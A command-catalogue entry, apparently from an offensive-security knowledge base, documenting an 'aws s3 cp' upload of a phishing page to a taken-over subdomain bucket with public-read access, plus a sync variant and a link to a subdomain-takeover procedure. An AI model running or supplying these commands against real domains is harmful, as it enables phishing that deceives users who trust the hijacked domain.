---
id: cmd-uuid-aws-s3-cp
data: 'aws s3 cp phishing.html s3://dangling-subdomain.mozaws.net/ --acl public-read'
tags:
  - aws
  - hosting
type: command
output: 'upload: phishing.html to s3://dangling-subdomain.mozaws.net/phishing.html'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:51:26.437Z'
verified: false
validated: true
submitted: true
---
# aws-s3-cp

## Command

```bash
aws s3 cp phishing.html s3://dangling-subdomain.mozaws.net/ --acl public-read
```

## Description

Uploads files to an S3 bucket for hosting on a taken-over subdomain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `phishing.html` | Local file to upload | Yes |
| `s3://...` | Destination bucket | Yes |
| `--acl public-read` | Sets public access | No |

## Examples

### Basic Usage

```bash
aws s3 cp phishing.html s3://dangling-subdomain.mozaws.net/ --acl public-read
```

### Advanced Usage

```bash
aws s3 sync ./content/ s3://dangling-subdomain.mozaws.net/ --acl public-read
```

## Expected Output

Confirmation of upload, e.g., 'upload: phishing.html to s3://dangling-subdomain.mozaws.net/phishing.html'.

## Related

- [[procedures/Host-Arbitrary-Content-on-Taken-Over-Subdomain]]
